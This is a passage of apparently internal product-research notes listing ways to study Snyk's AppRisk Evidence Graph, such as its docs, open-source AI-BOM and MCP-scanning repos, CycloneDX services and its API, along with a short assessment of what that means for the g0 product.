3. **Snyk AppRisk documentation deep-dive**
   - The Evidence Graph docs describe the correlation at a technical level
   - Key doc: https://docs.snyk.io/manage-risk/prioritize-issues-for-fixing/using-the-issues-ui/evidence-graph
   - Also: https://docs.snyk.io/manage-risk/prioritize-issues-for-fixing/set-up-insights/set-up-insights-associating-snyk-open-source-code-and-container-projects

4. **Inspect Snyk's open-source repos**
   - `github.com/snyk/cli-extension-ai-bom` — Go source for AI-BOM; check if it emits infrastructure references
   - `github.com/snyk/agent-scan` — Python source for MCP scanning; check for any infrastructure correlation
   - `github.com/snyk/cli-extension-mcp-scan` — Go bridge to Snyk platform; may reveal the data model

5. **CycloneDX v1.6 "services" field**
   - CycloneDX supports "services" (external APIs) with endpoint URIs, auth requirements, trust boundaries
   - If the AI-BOM emits services (not just components), these could be the link to infrastructure
   - Check: does `snyk aibom --json` output include a `services` array?

6. **Snyk API exploration**
   - Snyk has a REST API for projects, issues, and assets
   - An Evo design partner could query the API to see the underlying data model
   - Look for: asset relationships, dependency links between code and infra projects

7. **Black Hat 2025 recording**
   - "Secure at Inception" talk featured toxic flow analysis
   - URL: https://snyk.io/blog/secure-at-inception-black-hat-2025/
   - May contain technical details on how flows are constructed from multi-modal data

### Why This Matters for g0

**Short answer: it doesn't, yet.** The infra-level graph is Snyk's decade-old moat. g0's advantage is the **code-level** graph — showing agent flows, tool chains, and data paths from source code alone. This is actually more actionable for developers who don't have production infrastructure yet.

The infra graph becomes relevant for Guard0 platform (Phase 6+) if we want to offer enterprise architecture visualization. At that point, we'd integrate with cloud providers directly — but that's a 2027+ problem.
